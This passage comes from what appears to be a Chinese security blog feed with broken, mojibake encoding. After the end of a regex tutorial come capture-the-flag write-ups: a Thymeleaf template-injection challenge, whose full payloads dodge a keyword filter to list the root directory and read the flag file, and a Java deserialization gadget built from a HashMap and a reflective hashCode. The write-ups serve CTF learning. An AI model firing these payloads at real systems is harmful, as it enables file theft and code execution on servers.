align="left"><code>(?&lt;=pattern)</code></td><td align="left">æ­£åé¡¾</td><td align="left">å‘å·¦ï¼ˆå‘åï¼‰</td><td align="left">å­˜åœ¨ pattern</td></tr><tr><td align="left"><strong>è´Ÿå‘åè¡Œæ–­è¨€</strong></td><td align="left"><code>(?&lt;!pattern)</code></td><td align="left">è´Ÿåé¡¾</td><td align="left">å‘å·¦ï¼ˆå‘åï¼‰</td><td align="left">ä¸å­˜åœ¨ pattern</td></tr></tbody></table><h3 id="åŠŸèƒ½ç‰¹ç‚¹"><a href="#åŠŸèƒ½ç‰¹ç‚¹" class="headerlink" title="åŠŸèƒ½ç‰¹ç‚¹"></a>åŠŸèƒ½ç‰¹ç‚¹</h3><p><strong>é›¶å®½åº¦</strong>ï¼šåªæ£€æŸ¥æ¡ä»¶ï¼Œä¸æ¶ˆè€—å­—ç¬¦ï¼ˆä¸åŒ…å«åœ¨åŒ¹é…ç»“æœä¸­ï¼‰</p><p><strong>éæ•è·</strong>ï¼šæ–­è¨€ä¸­çš„ pattern ä¸ä¼šè¢«æ•è·åˆ°åˆ†ç»„ä¸­</p><p><strong>é¡ºåºæ•æ„Ÿ</strong>ï¼šåŒ¹é…å¼•æ“æŒ‰é¡ºåºæ£€æŸ¥æ–­è¨€æ¡ä»¶</p><br/><h2 id="è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a href="#è¿ç®—ç¬¦ä¼˜å…ˆçº§" class="headerlink" title="è¿ç®—ç¬¦ä¼˜å…ˆçº§"></a>è¿ç®—ç¬¦ä¼˜å…ˆçº§</h2><p>ä¸‹è¡¨ä»æœ€é«˜åˆ°æœ€ä½è¯´æ˜äº†å„ç§æ­£åˆ™è¡¨è¾¾å¼è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§é¡ºåº</p><table><thead><tr><th align="left">è¿ç®—ç¬¦</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><code>\</code></td><td align="left">è½¬ä¹‰ç¬¦</td></tr><tr><td align="left"><code>()</code>, <code>(?:)</code>, <code>(?=)</code>, <code>[]</code></td><td align="left">åœ†æ‹¬å·å’Œæ–¹æ‹¬å·ï¼ˆåˆ†ç»„å’Œå­—ç¬¦ç±»ï¼‰</td></tr><tr><td align="left"><code>*</code>, <code>+</code>, <code>?</code>, <code>{n}</code>, <code>{n,}</code>, <code>{n,m}</code></td><td align="left">é™å®šç¬¦ï¼ˆé‡è¯ï¼‰</td></tr><tr><td align="left"><code>^</code>, <code>$</code>, \ä»»ä½•å…ƒå­—ç¬¦ã€ä»»ä½•å­—ç¬¦</td><td align="left">å®šä½ç‚¹å’Œåºåˆ—ï¼ˆä½ç½®å’Œé¡ºåºï¼‰</td></tr><tr><td align="left"><code>|</code></td><td align="left">æ›¿æ¢ï¼Œé€»è¾‘æˆ–</td></tr></tbody></table><br/><h2 id="åˆ†ç»„å’Œå¼•ç”¨"><a href="#åˆ†ç»„å’Œå¼•ç”¨" class="headerlink" title="åˆ†ç»„å’Œå¼•ç”¨"></a>åˆ†ç»„å’Œå¼•ç”¨</h2><p>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œ<strong>åˆ†ç»„</strong>ï¼ˆGroupingï¼‰å…è®¸æˆ‘ä»¬å°†å¤šä¸ªå­—ç¬¦è§†ä¸ºä¸€ä¸ªæ•´ä½“å•å…ƒ</p><h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><p>ä½¿ç”¨åœ†æ‹¬å· <code>()</code> æ¥åˆ›å»ºåˆ†ç»„ï¼š(è¡¨è¾¾å¼)</p><p>ä¾‹å¦‚ï¼Œ<code>(ab)+</code> å¯ä»¥åŒ¹é… â€œabâ€ã€â€ababâ€ã€â€abababâ€ ç­‰ï¼Œä½†ä¸èƒ½åŒ¹é… â€œaâ€ æˆ– â€œbâ€</p><h3 id="åˆ†ç»„ç±»å‹"><a href="#åˆ†ç»„ç±»å‹" class="headerlink" title="åˆ†ç»„ç±»å‹"></a>åˆ†ç»„ç±»å‹</h3><table><thead><tr><th align="left">åˆ†ç»„ç±»å‹</th><th align="left">è¯­æ³•</th><th align="left">åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td align="left"><strong>æ•è·åˆ†ç»„</strong></td><td align="left"><code>(è¡¨è¾¾å¼)</code></td><td align="left">æ•è·åŒ¹é…å†…å®¹å¹¶åˆ†é…ç¼–å·ï¼ˆä»1å¼€å§‹ï¼‰</td></tr><tr><td align="left"><strong>éæ•è·åˆ†ç»„</strong></td><td align="left"><code>(?:è¡¨è¾¾å¼)</code></td><td align="left">åªåˆ†ç»„ä½†ä¸æ•è·åŒ¹é…å†…å®¹</td></tr><tr><td align="left"><strong>å‘½ååˆ†ç»„</strong></td><td align="left"><code>(?&lt;name&gt;è¡¨è¾¾å¼)</code> æˆ– <code>(?P&lt;name&gt;è¡¨è¾¾å¼)</code></td><td align="left">æ•è·åŒ¹é…å†…å®¹å¹¶åˆ†é…åç§°</td></tr></tbody></table><h3 id="åˆ†ç»„å¼•ç”¨"><a href="#åˆ†ç»„å¼•ç”¨" class="headerlink" title="åˆ†ç»„å¼•ç”¨"></a>åˆ†ç»„å¼•ç”¨</h3><table><thead><tr><th align="left">å¼•ç”¨ç±»å‹</th><th align="left">è¯­æ³•</th><th align="left">åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td align="left"><strong>åå‘å¼•ç”¨ï¼ˆè¡¨è¾¾å¼å†…ï¼‰</strong></td><td align="left"><code>\æ•°å­—</code></td><td align="left">åœ¨æ­£åˆ™è¡¨è¾¾å¼å†…éƒ¨å¼•ç”¨å‰é¢æ•è·åˆ†ç»„çš„å†…å®¹</td></tr><tr><td align="left"><strong>å‘½ååå‘å¼•ç”¨ï¼ˆè¡¨è¾¾å¼å†…ï¼‰</strong></td><td align="left"><code>\k&lt;name&gt;</code></td><td align="left">åœ¨æ­£åˆ™è¡¨è¾¾å¼å†…éƒ¨å¼•ç”¨å‰é¢å‘½ååˆ†ç»„çš„å†…å®¹</td></tr><tr><td align="left"><strong>æ›¿æ¢å¼•ç”¨ï¼ˆæ›¿æ¢æ“ä½œä¸­ï¼‰</strong></td><td align="left"><code>$æ•°å­—</code> æˆ– <code>\æ•°å­—</code></td><td align="left">åœ¨æ›¿æ¢å­—ç¬¦ä¸²ä¸­å¼•ç”¨å‰é¢æ•è·åˆ†ç»„çš„å†…å®¹</td></tr></tbody></table><br/>]]></content>
      
      
      <categories>
          
          <category> é›¶ç¢ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ•£é¢˜1.20</title>
      <link href="/2026/01/20/%E6%95%A3%E9%A2%981-20/"/>
      <url>/2026/01/20/%E6%95%A3%E9%A2%981-20/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2026åˆèµ›-EzJava"><a href="#CISCN-2026åˆèµ›-EzJava" class="headerlink" title="[CISCN 2026åˆèµ›]EzJava"></a>[CISCN 2026åˆèµ›]EzJava</h1><p>ç¬¬ä¸€æ¬¡å‚åŠ å›½èµ›ï¼Œè™½ç„¶æ²¡æœ‰å¸Œæœ›è¿›çº¿ä¸‹ï¼Œä½†è¿˜æ˜¯æ”¶è·é¢‡ä¸°ã€‚åˆèµ›ç»™äº†ä¸¤é“Javaé¢˜ï¼Œåˆ°åé¢ä¸€é¢˜500åˆ†ä¸€é¢˜50åˆ†ï¼Œå¦å¤–è¿™æ¬¡çš„é¢˜åæ²¿ç”¨äº†2024å›½èµ›çš„ezjavaï¼Œä½†æ˜¯è¿™æ¬¡è‚¯å®šæ²¡æœ‰é‚£ä¹ˆæŒ‘æˆ˜æ€§äº†ï¼Œå°±åªæ¶‰åŠäº†ä¸€ä¸ªJavaåç«¯çš„SSTIæ¨¡æ¿æ³¨å…¥ï¼Œç”¨çš„æ˜¯<code>Thymeleaf</code>æ¨¡æ¿å¼•æ“ã€‚SpringBootå®˜æ–¹æ¨èçš„æ¨¡æ¿å¼•æ“</p><p>ç™»å½•é¶æœºå”¯ä¸€æœ‰ç”¨çš„æ˜¯ç™»å½•å…¥å£ï¼Œè´¦å·å¯†ç å·²ç»æå‰å†™å¥½äº†ï¼Œä½†ç»™çš„ä¸æ˜¯æ­£ç¡®çš„å¯†ç ã€‚ æ‰¾å¯†ç æ‰¾äº†å¾ˆä¹…ï¼Œèµ·åˆæ‰«ç«¯å£æ‰«åˆ°äº†<code>/;admin</code>è·¯å¾„ï¼Œé•¿å¾—æ¯”è¾ƒç¨€å¥‡å»æœäº†ä¸€ä¸‹è¯´æ˜¯å¥½åƒå’ŒSpringSercurityæœ‰å…³ç³»ï¼ŒèŠ±äº†åŠå¤©ç ”ç©¶æ‰€è°“çš„SpringSecurityç»•è¿‡ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´ã€‚æœ€åå¯†ç å±…ç„¶æ˜¯å¼±å£ä»¤<code>admin123</code>ï¼Œè¿˜æ˜¯æ¶‰ä¸–æœªæ·±å•Š</p><p>åå°å°±ç›´æ¥æ¨¡æ¿çªè„¸äº†</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>ç°åœ¨æ—¶é—´: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;now&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ¸²æŸ“å‡ºæ¥å°±æ˜¯ç°å®æ—¶é—´</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>ç°åœ¨æ—¶é—´: <span class="tag">&lt;<span class="name">span</span>&gt;</span>2025-12-28T10:52:37.209748<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åé¢æµ‹è¯•7*7ä¹Ÿå¯ä»¥ï¼Œæ— æ‰€è°“å…¶å®ã€‚ç½‘ä¸Šæ‰¾äº†äº›ç°æˆçš„payloadè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸‰ä¸ªä¸»è¦çš„Wafï¼Œ</p><p>é¦–å…ˆæ˜¯<code>T(</code>ï¼ŒåŒ¹é…åˆ°ä¼šæ›¿æ¢æˆ<code>NoNo</code>ï¼Œè¿™é‡Œåœ¨ä¸­é—´æ’å…¥ä¸ªç©ºæ ¼å°±èƒ½ç»•è¿‡äº†</p><p><img src="/img/post/image-20251228185955406.png" alt="image-20251228185955406"></p><p>ç„¶åæ˜¯<code>new</code>ï¼ŒåŒ¹é…åˆ°ä¼šè¢«æ›¿æ¢æˆ<code>Wow</code></p><p><img src="/img/post/image-20251228213144264.png" alt="image-20251228213144264"></p><p>è·å–æ ¹ç›®å½•æ–‡ä»¶ç»“æ„</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>ç°åœ¨æ—¶é—´: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;T (java.nio.file.Files).list(T (java.nio.file.Paths).get(&#x27;/&#x27;)).collect(T (java.util.stream.Collectors).toList())&#125;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/image-20260105174223259.png" alt="image-20260105174223259"></p><p>ä¸Šé¢çš„æ¨¡æ¿ç­‰ä»·äº</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Files.list(Paths.get(<span class="string">&quot;/&quot;</span>)).collect(Collectors.toList());</span><br></pre></td></tr></table></figure><p><code>Files.list()</code> è¿”å›çš„æ˜¯ <code>Stream&lt;Path&gt;</code>ï¼Œè€Œ <code>Collectors.toList()</code> æ¥æ”¶çš„æ˜¯ <code>Stream&lt;String&gt;</code>ï¼Œä½†æ¨¡æ¿å¼•æ“ä¼šè‡ªå·±è¿›è¡Œç±»å‹è½¬æ¢</p><p>è¯»å–flagæ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>ç°åœ¨æ—¶é—´: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;T (java.nio.file.Files).readString(T (java.nio.file.Paths).get(T (java.lang.String).join(&#x27;&#x27;, T (java.util.Arrays).asList(&#x27;/&#x27;, &#x27;f&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;_&#x27;, &#x27;y&#x27;, &#x27;o&#x27;, &#x27;u&#x27;,&#x27;_&#x27;,&#x27;d&#x27;,&#x27;0&#x27;,&#x27;n&#x27;,&#x27;t&#x27;,&#x27;_&#x27;,&#x27;k&#x27;,&#x27;n&#x27;,&#x27;0&#x27;,&#x27;w&#x27;))))&#125;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/image-20260105175349522.png" alt="image-20260105175349522"></p><p>ä¸Šé¢çš„æ¨¡æ¿ç­‰ä»·äº</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Files.readString(Paths.get(String.join(<span class="string">&quot;&quot;</span>, Arrays.asList(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;w&quot;</span>))));</span><br></pre></td></tr></table></figure><br/><h1 id="MoeCTF-2025-ç¬¬äºŒåä¸‰ç« -å¹»å¢ƒè¿·å¿ƒÂ·çš‡é™¨æ˜Ÿæ²‰-å¤§ç»“å±€"><a href="#MoeCTF-2025-ç¬¬äºŒåä¸‰ç« -å¹»å¢ƒè¿·å¿ƒÂ·çš‡é™¨æ˜Ÿæ²‰-å¤§ç»“å±€" class="headerlink" title="[MoeCTF 2025]ç¬¬äºŒåä¸‰ç«  å¹»å¢ƒè¿·å¿ƒÂ·çš‡é™¨æ˜Ÿæ²‰(å¤§ç»“å±€)"></a>[MoeCTF 2025]ç¬¬äºŒåä¸‰ç«  å¹»å¢ƒè¿·å¿ƒÂ·çš‡é™¨æ˜Ÿæ²‰(å¤§ç»“å±€)</h1><p>ä¸€ä¸ªæœˆå‰çœ‹çš„ååºåˆ—åŒ–é¢˜ï¼Œé‚£æ—¶å€™å¯¹Javaéƒ½æ²¡æœ‰ä»€ä¹ˆç†è§£ï¼Œæœ€è¿‘æ„Ÿè§‰å¿˜å¾—å·®ä¸å¤šäº†å°±æå‡ºæ¥ç„ä¸€çœ¼ï¼Œå‘ç°å¾ˆå¤šä¹‹å‰éš¾ä»¥ç†è§£çš„åœ°æ–¹éƒ½æ¸…æ™°èµ·æ¥äº†</p><p>é¢˜ç›®æœ‰ç”¨çš„æ— éå°±ä¸¤ä¸ªç±»<code>Dog</code>ã€<code>DogService</code>è¿˜æœ‰ä¸ª<code>DogModel</code>æ¥å£</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.Dog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, DogModel &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String breed;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> hunger;</span><br><span class="line">    Object object;</span><br><span class="line">    String methodName;</span><br><span class="line">    Class[] paramTypes;</span><br><span class="line">    Object[] args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(<span class="type">int</span> id, String name, String breed, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.breed = breed;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.hunger = <span class="number">50</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBreed</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.breed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHunger</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.hunger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hunger = Math.max(<span class="number">0</span>, <span class="built_in">this</span>.hunger - <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.getClass() == o.getClass()) &#123;</span><br><span class="line">            <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog)o;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.id == dog.id;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.wagTail(<span class="built_in">this</span>.object, <span class="built_in">this</span>.methodName, <span class="built_in">this</span>.paramTypes, <span class="built_in">this</span>.args);</span><br><span class="line">        <span class="keyword">return</span> Objects.hash(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="built_in">this</span>.id&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dogé‡Œé¢æœ‰ä¸€äº›ç¥ç§˜çš„å­—æ®µå<code>Object</code>ã€<code>args</code>ä»€ä¹ˆçš„ï¼Œå¾ˆéš¾ä¸è®©äººæƒ³åˆ°åå°„è°ƒç”¨ï¼Œè€Œä¸”æ³¨æ„åˆ°<code>Dog</code>ä¸­æœ‰ä¸ª<code>hashCode()</code>æ–¹æ³•ï¼Œ<code>hashCode()</code>å†…éƒ¨è°ƒç”¨äº†<code>wagTail()</code>ï¼Œè¿™ä¸ª<code>wagTail()</code>åœ¨<code>DogModel</code>æ¥å£é‡Œé¢è¢«å®šä¹‰ä¸ºé»˜è®¤æ–¹æ³•ï¼Œå…·æœ‰æ–¹æ³•ä½“</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">default</span> Object <span class="title function_">wagTail</span><span class="params">(Object input, String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(methodName, paramTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•ä½“ä¸­è°ƒç”¨äº†åå°„ï¼Œæ˜¯ä¸€ç§å¯ä»¥æ‰§è¡Œä¸€æ¬¡å‘½ä»¤çš„æ–¹æ³•ï¼Œä½†æ˜¯è¿˜ä¸è¶³ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œé‡ç‚¹åœ¨<code>DogService</code>çš„<code>chainWagTail()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">chainWagTail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Dog dog : <span class="built_in">this</span>.dogs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">                input = dog.object;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> dog.wagTail(input, dog.methodName, dog.paramTypes, dog.args);</span><br><span class="line">            input = result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹åƒCCé“¾é‡Œé¢çš„<code>ChainedTransformer</code>äº†ï¼Œé€šè¿‡é“¾å¼è°ƒç”¨è·å–<code>Runtime</code>å®ä¾‹æ‰§è¡Œå‘½ä»¤ï¼Œåˆšå¥½DogServiceé‡Œé¢çš„<code>importBase64()</code>å…·æœ‰<code>readObject()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">importDogsBase64</span><span class="params">(String base64Data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64Data))) &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(example.demo.Dog.Dog dog : (Collection)ois.readObject()) &#123;</span><br><span class="line">                    dog.setId(<span class="built_in">this</span>.nextId++);</span><br><span class="line">                    <span class="built_in">this</span>.dogs.put(dog.getId(), dog);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var32) &#123;</span><br><span class="line">                var5 = var32;</span><br><span class="line">                <span class="keyword">throw</span> var32;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var5 != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ois.close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var31) &#123;</span><br><span class="line">                            var5.addSuppressed(var31);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ois.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException e) &#123;</span><br><span class="line">            ((Exception)e).printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¥½å¤štry-catchçœ‹ç€å¾ˆä¹±ï¼Œç°åœ¨é—®é¢˜æ˜¯è°ä½œä¸ºå…¥å£ç±»ï¼Ÿå‰é¢çš„<code>Dog</code>ç±»å…·æœ‰<code>hashCode()</code>æ–¹æ³•ä¸”å¯ä»¥åå°„è°ƒç”¨å‘½ä»¤ï¼Œåˆšå¥½<code>HashMap</code>çš„<code>readObject()</code>æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨<code>hash()</code>æ–¹æ³•è¿›è€Œè°ƒç”¨<code>hashCode()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span 